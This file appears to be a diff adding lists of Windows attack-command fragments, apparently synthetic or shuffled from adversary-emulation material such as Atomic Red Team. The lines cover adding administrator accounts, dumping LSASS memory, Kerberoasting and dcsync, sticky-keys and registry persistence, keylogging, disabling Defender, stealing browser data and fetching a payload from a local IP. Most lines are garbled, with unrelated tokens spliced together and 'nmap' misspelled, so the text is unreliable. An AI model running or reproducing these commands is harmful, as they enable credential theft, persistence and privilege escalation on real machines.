@@ -1,0 +1,64 @@
+net user = `` '' % volumn file execution \system32\osk.exe
+namp -sn $ { filename_regex }
+net user $ { hklm\software\microsoft\windows nt\currentversion\image file env : :list ) options\svchost.exe administrators
+net shortcut = `` keylog
+hack-browser-data-windows-64bit.exe
+net user administrator /add
+net user = $ : \users\
+namp -sn -l $ { args }
+`` c : localappdata % ) \\ $ ( ) = get-process appdata % ) \\ ( $ ( ( get-process appdata % \system32\osk.exe /grant administrators : = set-wmiinstance -namespace set-wmiinstance -namespace set-wmiinstance -namespace hklm\software\microsoft\active ) /grant ; querylanguage= ( $ _.creationtime = ( `` \system\currentcontrolset\services\winsock2\parameters
+bitsadmin.exe /create $ { source } -l @ { flag } -w
+curl /set shadow localappdata % \system32\osk.exe /grant 'https : \windows\temp\lsass_dump.dmp
+rdrleakdiag.exe /p volumn name you create = set-wmiinstance -namespace execution options\svchost.exe '' threadingmodel '' administrators ''
+namp -sn $ { output_zip_name } command= '' `` $ { target \windows\system32 '' '' ;
+`` -c : \windows\system32\desk.cpl , hklm : installscreensaver $ ( = new-object -command `` select *
+query user
+rundll32 popcalc.dll , keylog
+reg add `` hklm\software\microsoft\windows nt\currentversion\image , http : -comobject filter = `` keylog
+sc query
+net user = `` $ env : username )
+wscript $ { t1547.009 abc.exe.txt
+invoke-screencap = $ { windir you ( \users\ )
+cmdkey.exe /list
+net user `` hklm\software\microsoft\windows volumn name you create = set-wmiinstance file set-wmiinstance -namespace 'https execution hklm\software\microsoft\windows \updater.exe
+.\rubeus.exe kerberoast windir % localappdata % \system32\osk.exe /grant administrators : administrators : select -verbose
+fltmc.exe unload administrators ''
+net group `` hklm\system\currentcontrolset\control\session `` hklm\software\microsoft\windows c : menu\programs\startup\t1547.009.lnk `` defaultaccount '' c : \windows\system32\sethc.exe /a
+namp -sn $ { filename_regex }
+net user administrator /add
+.\procdump.exe -r -accepteula -s % get-service /user : $ target % \secrets -excludeproperty : windir set -disablerealtimemonitoring $ shortcut.save }
+net localgroup administrators administrators /add
+ffuf -w } -l $ target '' '' \windows\system32\sethc.exe
+get-childitem -filter `` hklm\software\microsoft\windows `` 7 tmp.run 0 keylog
+net user = `` appinit_dlls $ { user_name }
+invoke-screencap $ shortcut.workingdirectory }
+net `` hklm\system\currentcontrolset\services\winsock2\parameters `` .\ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+namp -sn $ `` domain
+python -c `` reg `` localaccount=true = [ net.securityprotocoltype ] : //192.168.1.29:9000/payload/redirect.sdb -o ; ; \inprocserver32 -- -command hklm : /set ) *
+reg query
+reg query hkcu\environment
+rdrleakdiag.exe /p i '' $ { filename_regex }
+sharprdp.exe computername= $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+net `` kerberos : :dcsync ) \\ $ { -classname -arguments -arguments $ shortcut = `` ;
+quser
+gobuster dir -u $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+reg `` hklm\software\microsoft\windows hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' `` reg_dword /d `` `` security packages '' /f
+net user = `` appinit_dlls
+query user
+net start spooler
+rdrleakdiag.exe /p $ target = `` $ target } ; consumer = `` $ { name='atomicredteam-wmipersistence-activescripteventconsumer-example in ( ( appdata % \system32\osk.exe : ' ) /grant minidump ( ' % \updater.exe -command @ ( `` $ ( `` ( get-process -ne `` $ i $ env
+namp -sn $ { user_name } '' /add
+quser
+net user administrator /add
+namp -sn $ { registry_path }
+net user = `` username )
+python make_image.py $ shortcut = `` domain
+$ shortcut = ) = `` keylog
+net user = `` hklm\system\currentcontrolset\control\session `` hklm\software\microsoft\windows cor_profiler '' `` administrators : $ { popcalc
+$ shortcut = `` keylog
+python -c `` hklm\software\microsoft\windows powershell `` domain /y $ { hklm\system\currentcontrolset\control\session /v dllname /d `` '' '' `` hklm\software\microsoft\windows root\subscription '' `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 )
+net user administrator /domain
+rundll32 popcalc.dll , keylog
+`` put $ a )
+rundll32 popcalc.dll , keylog
+net localgroup administrators `` cor_profiler
